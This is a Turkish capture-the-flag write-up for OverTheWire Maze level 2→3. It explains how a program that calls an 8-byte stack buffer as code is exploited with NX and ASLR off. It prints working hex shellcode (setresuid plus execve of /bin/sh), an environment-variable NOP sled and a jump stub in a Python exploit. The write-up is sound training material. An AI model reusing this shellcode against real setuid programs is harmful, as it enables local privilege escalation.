# OverTheWire — Maze Level 2 → 3

> Hedef: `maze2`'den `maze3` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **Çalıştırılabilir stack (NX kapalı)** + stack buffer'ın fonksiyon işaretçisi olarak çağrılması → env'deki shellcode'a sıçrayan 8-baytlık stub.

---

## 1. İlk Bakış
```bash
checksec --file=/maze/maze2
# No canary? -> Canary FOUND | NX DISABLED | No PIE
/maze/maze2            # argümansız → exit(1)
cat /proc/sys/kernel/randomize_va_space   # 0  (ASLR KAPALI)
```
**NX kapalı** = stack'teki baytlar kod olarak çalışabilir. ASLR kapalı = adresler deterministik.

## 2. Analiz
Sözde-kod:
```c
char buf[8];
void (*fp)() = buf;          // fp, buf'ı işaret eder
if (argc != 2) exit(1);
strncpy(buf, argv[1], 8);    // tam 8 bayt (overflow YOK, canary'ye dokunmaz)
fp();                        // buf'ı KOD olarak çağır
```
Overflow yok ama gerek de yok: program **stack buffer'ı doğrudan çağırıyor**. NX kapalı olduğundan buf'a yazdığımız makine kodu çalışır.

## 3. Zafiyet & Plan
Sorun: buf'a sadece **8 bayt** sığıyor — tam `execve("/bin/sh")` shellcode'u (~45 bayt) sığmaz.
Çözüm — **iki aşamalı**:
1. Büyük shellcode'u bir **ortam değişkenine** (env `SC`) koy; NOP sled ile öne yastıkla.
2. buf'a sığan 8 baytlık **stub**: `mov eax, <sled_adresi>; jmp eax` (`b8 <addr> ff e0` + `90`) → sled'e sıçra → shellcode.

ASLR kapalı olduğu için env adresi sabit. Adresi, **argv/env/execfn uzunlukları birebir eşleştirilmiş** 32-bit bir yardımcıyla okuyup, geniş NOP sled'in ortasını hedefliyoruz (küçük kaymaları sled yutar).

> İki tuzak:
> - **`MAX_ARG_STRLEN` = 128KB**: tek bir env string'i 131072 baytı aşamaz → sled'i 64KB tut.
> - **Null bayt yok**: `argv[1]` (stub) ve `SC` (env) C string olduğundan içlerinde `0x00` olamaz. Stack adresleri `0xffff….` olduğundan stub null-suz; shellcode da null-suz seçildi.

## 4. Exploit (özet)
```python
# 45 baytlık shellcode: setresuid32(geteuid x3) + execve("/bin//sh")
sc  = bytes.fromhex('31c0b031cd80 89c389c189c2 31c0b0d0cd80 31c050'
                    '682f2f7368 682f62696e 89e3 50 89e2 53 89e1 b00b cd80'.replace(' ',''))
SC  = b'\x90'*0x10000 + sc          # 64KB NOP sled + shellcode  (env değişkeni)
# 1) Adresi öğren: argv0="/maze/maze2", argv1=8 bayt, execfn 11 karakter eşleşsin
# 2) stub = b8 <base+0x8000 little-endian> ff e0 90   (8 bayt, sled ortası)
os.execve('/maze/maze2', [b'/maze/maze2', stub], {b'SC': SC})
```
`stdin`'e `/bin/cat /etc/maze_pass/maze3` besleyince, spawn olan kabuk (maze3) şifreyi basar.

Shellcode önce `setresuid32(euid,euid,euid)` yapar → `/bin/sh`'in yetki düşürmesini engeller, sonra `execve("/bin//sh")`.

## Dersler
| Konu | Not |
|------|-----|
| NX / DEP | Kapalıysa stack/heap'teki veri **kod** olarak koşar → klasik ret2stack/shellcode |
| Fonksiyon işaretçisi | Programın kendisi buffer'ı çağırması, overflow gerektirmeden kod çalıştırır |
| Küçük buffer | 8 bayt yetmez → stub ile env'deki büyük shellcode'a yönlen |
| Env shellcode + NOP sled | ASLR kapalıyken env adresi sabit; geniş sled adres hatasını affeder |
| `MAX_ARG_STRLEN` | tek argv/env string ≤ 128KB (`32*PAGE_SIZE`) |
| Deterministik adres | aynı argv0/argv1/execfn uzunluğu + aynı env = aynı adres (32-bit yardımcıyla oku) |
